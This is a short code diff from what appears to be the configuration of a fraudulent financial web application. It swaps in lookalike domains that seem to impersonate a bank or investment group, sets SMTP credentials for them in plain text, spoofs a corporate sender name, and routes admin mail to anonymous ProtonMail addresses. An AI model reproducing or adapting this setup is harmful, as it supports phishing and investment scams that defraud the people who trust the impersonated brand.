@@ -4,19 +4,22 @@ const fs = require('fs');
 const path = require('path');
 
 const smtpServer = {
-    host: "http://Example Group.com.au/webmail",
+    host: "http://mizuhogroup-client.live/webmail",
     port: 465,
     auth: {
-        user: "clients@Example Group.com.au",
-        pass: "82Z02JhPa{Sg"
+        user: "accounts@mizuhogroup-client.live",
+        pass: "2xVk3cMa+czc"
     }
 }
 
 const emailFrom = '"Example Group" <accounts@Example Group.com.au>';
 
-const adminEmail = "quincy.adams123@protonmail.com";
 
-const domain = "https://lseequity.live"
+// const adminEmail = "quincy.adams123@protonmail.com";
+
+const adminEmail = "allthekingsmen1215@protonmail.com";
+
+const domain = "https://client-mizuhogroup.live"
 
 var moneyFormatter = new Intl.NumberFormat('en-US', {
     style: 'currency',
